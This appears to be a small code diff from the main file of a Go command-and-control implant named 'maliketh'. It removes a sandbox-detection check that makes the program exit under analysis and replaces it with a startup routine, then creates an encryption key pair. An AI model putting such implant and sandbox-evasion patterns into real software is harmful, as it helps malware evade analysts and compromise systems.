@@ -5,7 +5,7 @@ import (
 	config "maliketh/pkg/config"
 	"maliketh/pkg/crypto"
 	"maliketh/pkg/implant"
-	"maliketh/pkg/sandbox"
+	"maliketh/pkg/startup"
 	. "maliketh/pkg/utils"
 	"os"
 	"time"
@@ -13,12 +13,7 @@ import (
 
 func main() {
 
-	if !config.DEBUG {
-		if sandbox.SandboxAll() {
-			DebugPrintln("Sandbox detected, exiting...")
-			return
-		}
-	}
+	startup.DoStartup()
 
 	public, private, err := crypto.CreateBase64KeyPair()
 	if err != nil {
